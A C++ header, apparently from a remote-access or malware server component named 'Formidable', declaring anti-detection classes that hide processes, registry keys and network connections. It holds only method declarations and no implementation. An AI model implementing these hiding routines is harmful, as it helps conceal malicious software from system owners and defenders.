#pragma once
#include <string>

namespace Formidable {
namespace Server {
namespace Security {

class AntiDetection {
public:
    static void InitializeAntiDetection();
    static void ApplyAntiDetectionTechniques();
    
    class ProcessHider {
    public:
        static void HideProcess();
        static void UnhideProcess();
        static bool IsProcessHidden();
    };
    
    class RegistryHider {
    public:
        static void HideRegistryKeys();
        static void UnhideRegistryKeys();
        static bool AreRegistryKeysHidden();
    };
    
    class NetworkHider {
    public:
        static void HideNetworkConnections();
        static void UnhideNetworkConnections();
        static bool AreNetworkConnectionsHidden();
    };
};

} // namespace Security
} // namespace Server
} // namespace Formidable
